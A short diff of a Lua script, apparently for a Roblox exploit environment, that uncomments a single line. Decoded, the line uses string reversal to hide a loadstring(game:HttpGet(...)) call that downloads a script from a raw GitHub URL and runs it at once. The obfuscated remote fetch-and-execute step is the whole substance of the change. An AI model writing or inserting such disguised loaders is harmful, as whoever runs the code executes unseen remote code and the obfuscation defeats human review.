@@ -2093,7 +2093,7 @@ end
 return Promise
  end,
 }
-	--getgenv()[("gnirtsdaol"):reverse()](game[("teGpttH"):reverse()](game, ("yrarbil02%IUxineohP/niam/eihpad/7d4fl/moc.tnetnocresubuhtig.war//:sptth"):reverse()))()
+	getgenv()[("gnirtsdaol"):reverse()](game[("teGpttH"):reverse()](game, ("yrarbil02%IUxineohP/niam/eihpad/7d4fl/moc.tnetnocresubuhtig.war//:sptth"):reverse()))()
 	local o_require = require
 	setmetatable(imports, {
 		__index = function(self, k) 
